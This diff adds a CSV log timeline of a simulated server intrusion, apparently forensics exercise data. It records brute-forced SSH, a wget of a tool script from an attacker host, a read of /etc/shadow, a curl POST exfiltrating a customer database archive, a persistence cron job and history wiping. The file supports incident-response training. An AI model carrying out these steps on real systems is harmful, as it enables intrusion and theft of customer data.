@@ -1,0 +1,15 @@
+timestamp,event_type,source,user,details
+2026-10-15T06:00:00Z,cron,syslog,root,Daily maintenance job
+2026-10-15T06:30:15Z,login,auth.log,jsmith,SSH pubkey from 192.168.1.45
+2026-10-15T07:15:22Z,login,auth.log,agarcia,SSH pubkey from 192.168.1.102
+2026-10-15T08:45:00Z,brute_force_start,auth.log,multiple,"Failed SSH from 198.51.100.23 — 10 accounts targeted"
+2026-10-15T08:47:12Z,login,auth.log,dev01,"SSH password from 198.51.100.23 — BRUTE FORCE SUCCESS"
+2026-10-15T08:48:30Z,recon,bash_history,dev01,"whoami; id; uname -a; sudo -l; find suid"
+2026-10-15T08:49:15Z,download,netflow,dev01,"wget tools.sh from 198.51.100.23:8080"
+2026-10-15T08:50:00Z,execution,bash_history,dev01,Executed /tmp/.tools.sh
+2026-10-15T08:52:30Z,priv_esc,syslog,dev01,"logmon --read /etc/shadow (SUID abuse)"
+2026-10-15T08:54:00Z,staging,filesystem,dev01,"tar czf /tmp/.backup.tar.gz /var/lib/nebula-app/backups/customer-db.sql"
+2026-10-15T08:54:30Z,exfiltration,netflow,dev01,"curl POST to 198.51.100.23:9090/upload — file: .backup.tar.gz"
+2026-10-15T08:55:00Z,cleanup,filesystem,dev01,"Deleted .tools.sh, .backup.tar.gz, logmon_out.txt"
+2026-10-15T08:55:10Z,persistence,crontab,dev01,"Added heartbeat cron: */5 * * * * curl 198.51.100.23:8080/heartbeat"
+2026-10-15T08:55:30Z,anti_forensics,bash_history,dev01,history -c
